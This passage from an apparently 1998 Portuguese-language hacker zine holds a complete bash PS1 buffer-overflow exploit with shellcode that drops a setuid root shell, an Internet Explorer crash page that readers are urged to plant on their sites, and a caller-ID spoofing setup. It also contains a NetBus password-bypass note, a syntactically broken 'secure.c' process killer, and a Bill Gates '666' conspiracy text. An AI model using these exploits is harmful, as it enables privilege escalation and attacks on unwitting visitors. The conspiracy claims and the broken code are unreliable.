+	quando a opcao '\w' quando dentro do PS1. 
+
+	Eis o codigo do exploitito:
+--[ code -tp.c- ]--
+#include        <unistd.h>
+
+char code[] =
+        "\xeb\x24"              /* jmp    GETADDR         */
+                                /* RUNPROG:               */
+        "\x5e"                  /* popl   %esi            */
+        "\x89\x76\x08"          /* movl   %esi,0x8(%esi)  */
+        "\x31\xc0"              /* xorl   %eax,%eax       */
+        "\x88\x46\x07"          /* movb   %al,0x7(%esi)   */
+        "\x89\x46\x0c"          /* movl   %eax,0xc(%esi)  */
+        "\xfe\x06"              /* incb   (%esi)          */
+        "\xfe\x46\x04"          /* incb   0x4(%esi)       */
+        "\xb0\x0b"              /* movb   $0xb,%al        */
+        "\x89\xf3"              /* movl   %esi,%ebx       */
+        "\x8d\x4e\x08"          /* leal   0x8(%esi),%ecx  */
+        "\x8d\x56\x0c"          /* leal   0xc(%esi),%edx  */
+        "\xcd\x80"              /* int    $0x80           */
+        "\x31\xdb"              /* xorl   %ebx,%ebx       */
+        "\x89\xd8"              /* movl   %ebx,%eax       */
+        "\x40"                  /* incl   %eax            */
+        "\xcd\x80"              /* int    $0x80           */
+                                /* GETADDR:               */
+        "\xe8\xd7\xff\xff\xff"  /* call   RUNPROG         */
+        ".tmp.tp";              /* Program to run .XXX.XX */
+
+int ADDR=0xbffff2ff;
+
+void main(void) {
+        char dir[256];
+        int i, align;
+
+        printf("BASH '\w' opcao PS1 buffer overflow.\n");
+
+        printf("- Criando /tmp/tp.c\n");
+        system("echo 'main() {'                        >  /tmp/tp.c");
+        system("echo 'system(\"cp /bin/sh /tmp/sh\");' >> /tmp/tp.c");
+        system("echo 'system(\"chmod +s /tmp/sh\");'   >> /tmp/tp.c");
+        system("echo '}'                               >> /tmp/tp.c");
+
+        printf("- Compilando /tmp/tp.c to /tmp/tp\n");
+        system("gcc -o /tmp/tp /tmp/tp.c");
+
+        printf("- Removendo /tmp/tp.c\n");
+        system("rm -f /tmp/tp.c");
+
+        /* Computing alignment for the 'address' directory */
+        getcwd(dir,255);
+        align=(strlen(dir)+2) % 4;
+
+        memset(dir,'A',255);
+        dir[255]=0;
+
+        printf("- Criando dir. AAA.../AAA.../AAA.../CODE.../ADDR...\n");
+        mkdir(dir,0777);
+        chdir(dir);
+        mkdir(dir,0777);
+        chdir(dir);
+        mkdir(dir,0777);
+        chdir(dir);
+
+        /* create directory which name is our code */
+        mkdir(code,0777);
+        chdir(code);
+
+        /* create directory which name is return addresses */
+        for(i=align;i<252;i+=4) *(int *)&dir[i]=ADDR;
+        mkdir(dir,0777);
+        chdir("../../../../");
+
+        printf("- OK.\n\n");
+}
+--[ code -tp.c- ]--
+
+			rode isto como usuario normal do sistema:
+        
+	  [raquerzao]:~$ id
+        uid=1000(reqUer) gid=1000(raqUer) groups=1000(test)
+        [raquerzao]:~$ ./bashps1
+        BASH '\w' opcao PS1 buffer overflow.
+        - Criando /tmp/tp.c
+        - Compilando /tmp/tp.c to /tmp/tp
+        - Removendo /tmp/tp.c
+        - Criando diretorios AAA.../AAA.../AAA.../CODE.../ADDR...
+        - Ok.
+
+Agora provavelmente voce devera ter o tp.c no seu diretorio /tmp.
+        [raquerzao]:~$ ls -l /tmp/tp
+        -rwxr-xr-x   1 test     test         3981 Sep  4 20:54 tp
+
+Entao como r00t rode:
+bash# export PS1='bash:\w\$ '
+debian:~# cd ~/reqUer
+debian:/home/reqUer# cd AAAAAAAA*/*/*/*/*
+shell-init:couldnotgetcurrentdirectory:getwd:cannotaccessparentdirectories
+shell-init:couldnotgetcurrentdirectory:getwd:cannotaccessparentdirectories
+
+Entao a bash morre (sniff ;)) ai, é facil, 
+        [raquerzao]:~$ ls -l /tmp/sh
+        -rwsr-sr-x   1 root     root       304676 Sep  4 20:55 sh
+
+	
+	Mas espere, nao é so issu!!! Se voce ligar (011)1406, voce podera
+	adiquirir esta linda carta de amor para o tcsh, outra exclusivida
+	de das empresas elitaum de deus ;)
+
+
+		Bom, a mesma coisa funciona com o /bin/tcsh... 
+		Trusted Cshell??? I dont think soo :)
+
+	Bom, de qualquer modo no tcsh, e' possivel voce instalar um patch
+	para que esta carta de amor para de chegar ao seu sistema,.abaixo
+
+--- tcsh-6.07.06.orig/sh.dir.c
++++ tcsh-6.07.06/sh.dir.c
+@@ -78,7 +78,7 @@
+     char    path[MAXPATHLEN];
+ 
+  
+-    tcp = (char *) getwd(path);
++    tcp = (char *) getcwd(path, MAXPATHLEN);
+     if (tcp == NULL || *tcp == '\0') {
+        xprintf("%s: %s\n", progname, path);
+        if (hp && *hp) {
+@@ -549,7 +549,8 @@
+     }
+ #endif /* apollo */
+            
+-    (void) strcpy(ebuf, short2str(cp));
++    (void) strncpy(ebuf, short2str(cp), MAXPATHLEN);   
++    ebuf[MAXPATHLEN-1]=0;
+@@ -1061,7 +1062,7 @@
+ #endif /* apollo */
+                continue;       /* canonicalize the link */
+            }
+-#endif /* S_IFLNK */
++#endif /* S_IFLNKXYZ */
+            if (slash)
+                *p = '/';
+        }
+@@ -1096,7 +1097,8 @@
+        /*
+         * Start comparing dev & ino backwards
+         */
+-       p2 = Strcpy(link, cp);
++       p2 = Strncpy(link, cp, MAXPATHLEN); 
++       link[MAXPATHLEN-1]=0;
+        found = 0;
+        while (*p2 && stat(short2str(p2), &statbuf) != -1) {
+            if (DEV_DEV_COMPARE(statbuf.st_dev, home_dev) &&
+@@ -1119,7 +1121,7 @@
+            cp = newcp;
+        }
+     }
+-#endif /* S_IFLNK */
++#endif /* S_IFLNKXYZ */
+ 
+ #ifdef apollo
+     if (slashslash) {
+@@ -1255,7 +1257,9 @@
+                return (0);
+        }
+     }
+-    (void) Strcpy(s, dp->di_name);
++
++    (void) Strncpy(s, dp->di_name, MAXPATHLEN); 
++    s[MAXPATHLEN-1]=0;
+     return (1);
+ }
+
+---
+codigo por: MiG.
+texto  por: bloodar00tou.
+
+/bin/bash buffer overflow.
+by - reg (c) blood@puruca.com.br
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³5 - Microsoft Internet Exploder BUG!!! <object> boguzes	             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot  ³°°
+		  	  						  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+
+	IE explorer did it again ;) !!! Eu acho impressionante  como
+	ele, ICQ e sendmail conseguem ter tantos bugs... Bom, melhor
+	para todos nos. O internet explorer, tem um html tag chamado
+	<object>, este se usado de forma maliciosa (woowhow!!!) pode
+	crashar o Internet Explorer 4.0 sob a queridissima janela de
+	todos os santos bugs ;),  
+	O abaixo, e como o bug funciona, veja:
+
+
+<OBJECT CLASSID=____mais de muitos caracteres.____></OBJECT>
+Abrindo uma caixa de dialogo do IE dizendo a comum frase do rat0es por ai:
+"IEXPLORE: ...illegal operation" e entao o ato final acontece, o IE fecha.
+ou entao a famosa tela azul do windows e entao voce precisa rebootar a sua
+maquina.
+
+	Bom, veja um exemplo do bug:
+-- iecrashobject.html --
+<HTML>
+Crashando o IE 4.0, para um mundo melhor.
+<OBJECT
+CLASSID=111111111111111111111111111111111111111111111111111111111111111111
+11111111111111111111111111111111111111111111111111111111111111111111111111
+11111111111111111111111111111111111111111111111111111111111111111111111111
+11111111111111111111111111111111111111111111111111111111111111111111111111
+111111111111111111111111111111111111>
+</OBJECT>
+</HTML>
+-- iecrashobject.html --
+
+	Coloque isto na sua pagina (index.html) e so espere para ver os
+	carinhas entrando e saindo mais rapido que a mae deles do maoso
+	leu dos muitos pais que o garoto tem. ;)
+
+MSIE bug!!! Abrindo bill gaytes OpenWide!!!
+by bloodroot|bi0t3k. 
+blood@deathknights.com
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³6 - Bill Gates e a besta (666), veja a verdade sobre a besta           ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by beltra ³°°
+		  	  						     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+"Recentemente, segundo os nossos estudos, nos descobrimos o que"
+"temiamos... Bill Gates é a besta, veja o relatorio completo" - Linus Torto.
+--.--
+Se voce usa produtos Microsoft, deve saber destes fatos...
+
+Voce sabia que o verdadeiro nome de Bill Gates e Willian Henry
+Gates III? Bom, o que ha de aterrorizante neste nome? Se você
+pegar todas as letras do nome Bill Gates III, e transforma-lo no
+codigo ASCII (American Standard Code for Information
+Interchange) equivalente, somando os numeros, obtera o número
+666, que e o numero da Besta!
+
+                B = 66
+                I = 73
+                L = 76
+                L = 76
+                G = 71
+                A = 65
+                T = 84
+                E = 69
+                S = 83
+                I =  1
+                I =  1
+                I =  1
+                   -----
+                    666
+
+Coincidencia? Talvez, porem pegue Windows95 e faz o mesmo,
+voce obtera 666! E o mesmo vale para MS-DOS 6.22! Ainda acha
+coincidencia?
+
+MS-DOS 6.22 -> 77+83+45+68+79+83+32+54+46+50+49 = 666
+Windows 95 -> 87+73+78+68+79+87+83+57+53+1 = 666
+
+.Agora vem o melhor!
+
+Se voce tiver o "Excel 95" (nao e o Excel do Office97), faca esta
+prova:
+
+     Abra um arquivo novo;
+     Posicione-se na linha 95
+     Clique o botao 95, assim a linha inteira ficara selecionada;
+     Pressione <tab>, para ir para a segunda coluna;
+
+     Selecione o menu "Ajuda (?)" e em seguida "Sobre o
+     Microsoft Excel...";
+
+     Pressione ctrl + alt + shift e (mantendo-as pressionadas),
+     selecione a opção "Suporte tecnico" na janela de ajuda.
+
+     Ira aparecer uma janela, com o titulo: THE HALL OF
+     TORTURED SOULS. Isto realmente e aterrorizante! E um jogo
+     similar ao Doom, e voce pode percorre-lo com os setas de
+     direcao. Nas paredes aparecem os nomes, em movimento,
+     das "almas torturadas"...
+
+     Agora va ate as escadas que aparecem e volte em direcao a
+     parede que estava as suas costas ao começar o jogo. E
+     branca e quadriculada...
+
+     Tecle EXCELKFA. A parede se abre e revela uma passagem
+     secreta. Entrando nela, você ira andar num caminho elevado
+     (tente nao cair, o que é muito dificil). Quando você chegar
+     ao final vera algo REALMENTE aterrorizante!
+
+Poderia ser uma brincadeira dos programadores da Microsoft ou
+não? Realmente, nao seria surpreendente que Bill Gates fosse o
+"Anti-cristo", alem do que, ja disse a Biblia que "...alguem poderoso
+vira e guiara o mundo a destruicao...".
+
+E Bill Gates sem duvida tem esse tipo de poder nas suas maos.
+Mais de 80% dos computadores do mundo tem Windows e DOS
+(inclusive os do Pentagono!). Se todos esses produtos tiverem
+algum tipo de pequeno programa camuflado (como este "Hall of
+Tortured Souls") isto pode dar-lhe o controle de configurar os
+arsenais nucleares, fazendo estragos nos sistemas de segurança, e
+nos sistemas financeiros do mundo etc...
+
+Tudo isso pode ser feito apartir da sua sede e nao esta longe da
+realidade! Somente usando o Internet Explorer eles podem espiar
+o que temos no computador bit a bit cada vez que nos
+conectamos. Talvez o fim do mundo esteja proximo e isto seja
+somente a ponta do iceberg...
+
+Citacao da Biblia:
+"... e ele obrigou a todos, pequenos e grandes, ricos e pobres,
+livres e escravos, a receber uma marca em sua mao direita ou
+em seu rosto, de tal forma que ninguem poderia comprar ou
+vender sem a marca, que e o nome da Besta ou o numero do seu
+nome. (...) este número e 666." Apocalipse 13:16-18
+
+Isto e algo em que se deve pensar... porque, se na Biblia, no livro
+do Apocalipse diz que sem o sinal da besta ninguem poderia ser
+capaz de comprar, vender, fazer transações comerciais etc...
+então, minha pergunta e: a Internet hoje em dia nao e uma
+necessidade para se fazer negocios? Note que a Internet tambem e
+conhecida como a World Wild Web ou WWW... Outra forma que
+podemos escrever W e V/ (VI), assim:
+
+            W W W  =  VI VI VI  =  666
+
+Isto da o que pensar... Nao esta tudo encaminhando-se para a
+Internet? Comprar/vender bens, transações comerciais... E a
+Microsoft não está sempre tentando ter o monopólio da tecnologia
+dos softwares que produz, e agora principalmente, da Internet???
+
+O Apocalipse também diz que "...a marca da Besta estará na mão
+e no rosto de cada um...". Se a Internet fosse em realidade o sinal
+da Besta, não estamos começando a levá-lo nas nossas maos
+(usando o mouse) e em nossos rostos (monitor)?
+
+Finalmente, tudo se encaixa (ou tudo é apenas fruto da nossa
+imaginação?)...
+
+Lembre-se, o demônio vem para enganar, roubar e destruir...
+assim, fique atento com respeito a Bill Gates e a Microsoft.
+
+"Estar ou não estar de acordo com a WWW ou a Besta", essa não
+é a questão. E se WWW é o 666? Ou Bill Gates é a Besta?? O que
+vamos fazer??? Cancelar nossa conexão com a Internet? Não
+utilizar mais os produtos da Microsoft? Formatar os micros com
+Windows95 pra sempre? AAAHHHHHHH!!! Isto não te faria nenhum
+bem, nem teria resultado algum contra o homem mais rico do
+mundo!
+Apenas releia este texto com atenção... e tire suas próprias
+conclusões...
+
+Lembre-se, "o fim está próximo!"
+Nunca deixe de crer... The truth is out there...
+
+bill é a besta (c) 1998. productions
+by "beltra" o bill é a besta, (c).
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³7 - Anti-bina systems, hackeando sistemas telefonicos digitais         ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+		  	  			   			   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+ Recentemente, rio de janeiro, Sao Paulo, Belo horizonte, Rio grande do sul
+ e outros estados do brasil , ja estao no minimo 70% digital , o que  torna
+ possivel algumas tecnicas 31337 no seu modem...  Como por exemplo  enganar
+ binas, de qualquer marca que voce quiser, eu testei em  algumas BBSs,  mas
+ em servidores eu nunca precisei usar, entao facam o teste a vontade. ;)
+
+	   Este e' um simples projeto para um esquema de bloquear o 
+	   seu telefone, uma vez que  voce ligue para um lugar  que
+	   tenha bina. ;)
+
+ [ funcionamento ] ---------------------------------------------------------
+ 
+ Bom, basicamente e um pedaco de hardware, que quando voce construir tudo
+ saira algo bem feio, mas bastante util.
+
+  Um exemplo do que ira acontecer: 
+  ATZ
+  OK
+  ATDT2345678  - ligando para o numero 2345678
+
+  Neste mesmo momento, voce deve ter um outro terminal no seu computador,
+  preparado com outra linha (linha 2). Entao voce faz a mesma coisa no seu
+  segundo terminal. 
+ 
+  ATZ
+  OK
+  ATDT2345679 - ligando para o numero 2345679
+  CONNECT 2400  - especifica BAUD/rate
+
+  Considerando que, o numero que tenha bina e': 2345678, e o seu telefone de
+  casa e': 542-2342, assim que voce ligar para 2345678, o telefone 2345678,
+  que tem um bina instalado ira catar o seu telefone verdadeiro, mas se voce
+  estiver usando este sistema aqui, ele ira catar o seu telefone verdadeiro,
+  o que ABS faz e', na hora que voce ligar pelo ABS, o bina so ira pegar  o 
+  segundo telefone de um numero qualquer que voce especificou antes. Assim,
+  no bina ira aparecer: "Ligacao originada do no.: 564.5463" Que nao e' o 
+  seu numero verdadeiro. ;) Acho que ficou meio dificil de entender mais.
+
+  Os usos para este tipo de hardware sao imensos, considerando que somente 
+  um telefone com um sofisticado e novo sistema de filtro, poderia realmente
+  catar o verdadeiro numero do telefone, mesmo assim seria necessario estu-
+  dar a fundo o sistema do ABS. 
+
+  [ hardware ] -------------------------------------------------------------
+
+  Bom, o que voce vai precisar para construir esta bagaca:
+ 
+  - 2 modems externos (e necessario que todos os dois sejam externos)
+  - 2 linhas telefonicas (nesta mesma edicao da zine eu ensino como puxar
+                          uma linha direto para a sua casa)
+  - 1 cabo de modem (null)
+  - Os cabos de telefones e soquetes apropriados.
+
+	E' necessario que todas os modems permitam conexoes no modo DUMB 
+      (burro???), para que nenhum modo qualquer de outros tipos de ter
+      minais possam atrapalhas o trabalho. Voce  tambem usara  o  modo
+ 	SMART de terminal. 
+
+  [ setupando ] ------------------------------------------------------------
+  
+  1. Ponha um dos terminais em modo DUMB, e o outro em modo SMART.
+  2. Configure o terminal SMART em modo auto-antender pelo modem. Geralmente
+     o comando e':  ATS0=1&W.  
+  3. Plug o cabo do modem nos dois modens, fazendo um conexao.
+  4. Conecte a linha que sera usada como isca (a linha falsa) em modo DUMB.
+  5. Conecte a linha verdadeira em modo SMART.
+  6. Ligue os modems.
+  7. Teste o ABs, ligando para a sua estacao (prefixo do seu numero) e peca
+     para que eles identifiquem o numero que esta ligando.
+  
+  [ conectando ] -----------------------------------------------------------
+  
+  Va no seu programa de conexao (telnet.exe? sux!!!).
+  Entao, agora pegue o seu terminal DUMB e ligue para o seu terminal SMART,
+  como voce o configurou como auto-answer, entao voce automaticamente agora,
+  estara se conectando a outra linha digital. 
+
+  Voce facar algo assim:
+  ATZ
+  OK
+  ATDT4324242 - Linha do modem na configuracao SMART, que sera detectada
+		    pelo bina.
+ 
+  CONNECT 2400.
+
+	Agora, voce ja esta conectado no modem 2 (smart), entao agora e' so
+      fazer isto:
+
+		AT
+ 		OK
+		ATDT2345678 - Linha com bina.... Que nao pegara o seu telefone
+				  verdadeiro.
+
+  [ finalle ] --------------------------------------------------------------
+	
+	Agora, que o modem ja nao pega mais a sua linha, e' estupidamente
+	simples voce fazer qualquer merda ;) Para se desconectar e' so apertar
+	'+++', e do resto e' relaxar e brincar com o ABS.
+
+thanx to: digital|darkcore|dert
+
+ABS - Anti-bina Systems
+blood@deathknights.com
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³8 - netbus sekurity advisory					             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+		  	  			   			   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+        .[The Phone9 Communications Systems (c) 1997-1998 productions].       
+		            .[Sekurity advisory].
+			        .[27/09/98 - P9].
+		    .[netbus advisory - by The bloodroot].
+
+Contents:
+'''''''''
+	
+	01: Sumario
+	02: Vulnerabilidade
+	03: Comprometimento
+	04: Detectando e removendo o netbus
+      **: Removendo a senha do netbus via telnet - by Phineas Phreak
+
+01: Sumario
+
+Pouco tempo depois do lancamento do conhecido programa Back Orifice da cDc,
+uma geracao de programas baseados no codigo do  BO,  ou nao relacao cliente
+servidor que o BO e o Back Office implementam no windows95/98.
+
+O que e' algo bem forte no netbus e a possibilidade dele ser usado em siste
+mas No Trust(NT), diferenciando-se do Back Orifice, que somente afetas win-
+dows95 e 98. 
+
+Utilizando-se do protocolo TCP, permite conexoes remotas por meio de telnet
+ou do cliente, embora no  telnet os comandos sejam um tanto estranhos e  as
+interpretacoes dos comandos sao bem estranhas, a melhor maneira de se  usar 
+o Netbus, e' simplesmente usando o seu cliente, que permite que funcoes se-
+jam feitas em uma interface mais amigavel... :) 
+
+Por estas pequenas mais maldosas e habilidosas mudancas, o netbus esta  to-
+mando o lugar do Back Orifice, embora seja um tanto mais seguro e sem possi
+veis virus e backdoors dentro do programa, o netbus sera o no BO???
+
+02: Vulnerabilidade
+
+Assim como o Back Orifice, o Netbus nao apresenta nenhuma vulnerabilidade e
+na verdade e' uma ferramenta mais seria que o BO, permitindo a  remocao  da 
+backdoor pelo proprio programa, embora assim continua sem apresentar vulne-
+rabilidade, nao existe porque sentir medo de uma outra nova arma que o net-
+bus usa.
+
+03: Comprometimento
+
+O netbus  se destaca do BO,  por algumas caracteristicas especificas  sobre
+a sua soberania sobre o servidor, mais funcoes podem ser exercidas no siste
+ma, e ainda e' auto-instalava, como o Back Orifice, entao em uma unica exe-
+cucao, voce ja esta vulneravel...
+
+As funcoes que o netbus tem a mais que o BO, sao:
+- Pode rebootar o servidor
+- Pode desconectar usuarios da rede
+- Permite enviar comandos ou caracteres para aplicativos ativos
+- Nao aparece na lista de tarefas do windows
+
+E ainda por cima, o netbus usa-se de uma senha para permitir acesso ao  seu
+servidor, a senha nao e' muito incomum, semelhante a string abaixo:
+Password:0:my_password
+
+Porem ou backdoor ou apenas falha de programacao, o programa possui uma fa-
+lha que permite a conexao de um cliente remoto  sem que este tenha a  senha
+do servidor, bastando mudar a string do password de '0' para '1'. :)
+
+04: Detectando e removendo o netbus
+
+O netbus era enviado para usuarios da internet como um patche.exe para mui-
+tos bugs no windowsNT e 95,  embora este nome possa ser facilmente  mudado,
+o netbus ainda sim representa a inseguranca, em qualquer nome...
+
+Netbus utiliza como padrao conexoes  TCP,  que podem ser fistas  facilmente  
+com um simples netstat, e ele se instala nas portas 12345,  ou 12346  tanto
+
+Para detectar o netbus no seu sistema a primeira coisa para se fazer e' exe
+cutar este comando abaixo:
+c:\> netstat -an | find "1234"
+
+Caso voce tenha algum retorno,  entao existe uma forte possibilidade  que o
+sistema ja estaja vulneravel ao cliente do netbus. Tambem  se  e'  possivel
+ver a atividade do netbus pelo telnet... Com o comando:
+c:\> telnet 127.0.0.1 12345
+ou
+c:\> telnet 127.0.0.1 12346
+
+Caso o netbus estiver instalado no seu sistema, entao voce vera na tela  do
+telnet o seguinte:
+
+NetBus 1.63
+ou
+NetBus 1.60
+
+Alem disto, o programa tambem deixar marcas no sistema de execucao do  win-
+dows, mais especificamente no registro do sistema,  use o programa  regedit
+para vasculhar o registro pelos seguintes rastros:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run[Nome do
+NetBus]
+HKEY_CURRENT_USER\Patch\Settings\ServerPwd
+
+A primeira chave indica que o netbus e'  executado no boot do windows  e  a
+segunda indica o password que em texto puro, pode ser visto por qualquer um
+o que tira a fe de certas pessoas quanto a qualidade do Netbus :)
+
+Para remover o netbus, eu recomendo o programa feito por uma tal de General Tech, 
+que foi mostrado no Jornal O Globo de 28/09/98,  o  programa (Backdoor Protection System v1.0)
+e' o primeiro programa que remove back orifice e netbus em um unico programa...
+Caso voce nao ache o programa, voce pode baixa-lo nos seguintes enderecos:
+--
+http://www.phone9.org/labs/tools/bps.exe
+http://www.oglobo.com.br/bsp.exe
+http://www.puruca.com.br/bps.exe 
+--
+[obs. O programa tem 3kbytes mesmo.]
+
+Fora este programa,  voce tem varias opcoes de desinstalar o netbus do  seu
+sistema, pelo proprio servidor ou cliente... Veja:
+c:\>nome_do_servidor_do_netbus.exe /remove
+
+Isto ira remover o servidor...
+
+2) Utilize o cliente do netbus para fazer essa desinstalacao,  va na  opcao
+"Server Admin" e depois "Remove Server".
+
+3) A remocao do netbus pelo registro e' bem simples,  apenas devera ir  nas
+chaves abaixo e remover ou os valores ou entao o proprio registro,  voce e'
+que escolhe :)
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run[Nome do
+NetBus]
+HKEY_CURRENT_USER\Patch\Settings\ServerPwd
+
+Isto devera retirar totalmente o netbus do seu computador...
+
+
+**: Removendo a senha do netbus via telnet - by phineas phreak
+
+
+...
+
+greets to: x-force team, paranoia, e Phineas Phreak.
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³9 - Protegendo sua maquina contra loops 			             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by kasper ³°°
+		  	  			   			      ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+  Em varios sistemas unix ou linuxzes um dos bugz mais chatos que existem
+  concerteza sao aqueles de CPU time, que deixam a sua  maquina lerda  ao
+  deixar a sua CPU em loop, ou seja, fazendo a mesma funcao repetidamente
+  sem parar :) 
+  
+  O programa abaixo monitora estas funcoes da CPU, e caso  algumas  delas
+  estejam consumindo muita memoria, ou caso entrem em loop, esta sera ki-
+  llada pelo programa. Todos os arquivos que serao monitorados sao os que
+  sao mostrado pelo comando ps aux, e todos este serao passados para o ar
+  quivo /etc/pstab,  onde voce vera um log das suas atividades  se  estao 
+  usando muito da CPU ou se apenas estao nao taixa aceitavel :) O progra-
+  ma tambem permite um sistema do qual voce seleciona certos arquivos que
+  por propria natureza ocupma muito tempo na memoria,  podem ser  mudados
+  e aceitados pelo programa. Bom, sem mais falas... Ai vai o codigo:
+
+--.[secure.c].--
+/* keep your self secure
+
+* O programa sofreu muito pequenas alteracoes no codigo por bloodroot
+* mas o codigo basico e todo o credito deve ser dado para Kasper.
+* codigo por - Kasper
+
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+#define CPULIMIT 90
+#define MEMLIMIT 90
+
+char *dontkill[]={"",""};
+
+void parse_pstab(char pstab[]);
+void do_pstab();
+int checkfontkill(char name[]);
+int checksize_for_dontkill();
+
+void main()
+{
+	if(fork() > 0) exit(0);
+	do_pstab();
+}
+
+void do_pstab()
+{
+	char pstab[1024];
+	FILE *pst;
+	
+our_loop :
+	system(">/etc/pstab ps aux");
+	  if(!(pst=fopen("/tmp/pstab","r"))) main();
+	 
+    	    while(!(feof(pst))) {
+			 fgets(pstab,sizeof(pstab),pst);
+                   parse_pstab(pstab);
+      }
+	sleep(1);
+	fclose(pst)
+	goto our_loop
+}
+
+void parse_pstab(char pstab[])
+{
+   char who[16];
+   char pid[8];
+   char cpu[8];
+   char mem[8];
+   char none[8];
+   char name[16];
+	   sscanf(pstab,"%s %s %s %s %s %s %s %s %s %s %s",name,pid,cpu,mem
+	   if(check_dontkill(name))
+	   kill(atoi(pid),9);
+}
+
+int check_dontkill(char name[])
+{
+   int i=0;
+
+   while(1 < checksize_for_dontkill()) {
+      if(check_dontkill(name))
+	  i++;
+   }
+   return(1);
+}
+
+int checksize_for_dontkill()
+{
+   int i=0;
+   while(1) {
+   if(dontkill[i]!=NULL) i++;
+     else
+	  return i-1;
+--.[secure.c].--
+
+Verifique a linha 79, para adcionar os programas que voce nao quer que seja
+killado pelo secure.c :) Estude-o, aprenda-o e depois telnet 127.0.0.1 19 :)
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³10 - Rompendo permissoes em sistemas NT 			             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄä¿ by bloodroot ³°°
+		  	  			   			    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+ 
+
+Descricao:
+ Ganhando acesso no sistema a locais onde voce nao possui acesso.
+
+Sistemas afetados:
+ Windows NT (somente)
+
+Problema:
+
+ O problema envolve o sistema NT e o sistema NTFS, explorando tal falhas, e
+ possivel se ter acesso a qualquer lugar do servidor, por exemplo / .
+
+Vulnerabilidade:
+
+ Digamos que o admin tenha setupado  a sua rede para somente dar acesso  ao
+ User Management for Domains (usrmgr.exe) para membros do grupo do admin da
+ rede, e deu acesso negado para qualquer outros usuarios, e grupos.  Entao,
+ tecnicamente voce nao teria acesso ao programa sem ser do grupo do  admin,
+ mas os tempos mudaram, e tambem o conceito de seguranca que um estupido c3
+ da microsoft exerce :) Entao digamos que o usuarios billgay  tenha  acesso 
+ acesso a pagina html blank.html. Entao ele pega o seu bugado IE e edita  a
+ pagina e coloca o seguinte: 
+	
+	<A HREF="usrmgr.exe">User (dumb) manager</A>
+
+ Ele salva o arquivo e depois cria um outro arquivo .html chamado de:
+ acesso.htm, no acesso.htm voce tera o seguinte:
+
+    <SCRIPT LANGUAGE="JavaScript">
+    <!--
+
+    function Play_()
+
+	    {
+	    document.snd.play(false);
+	    }
+
+
+    // -->
+
+    </SCRIPT>
+    
+    <EMBED SRC="whoaminerd.wav" NAME="snd" WIDTH="1" HEIGHT="2" MASTERSOUND>
+
+    <A HREF="http://www.microsoft.com"OnMouseOver="window.status='Where do 
+    you want to go tommorow???';return true">Microsoft's nerds Page</A>
+
+    <A HREF="http://www.ibm.com"OnMouseOver="window.status='International 
+    Butt-plug Machines';return true">IBM's 31337 Homepage</A>
+
+    <IMG SRC="billnerd.gif">
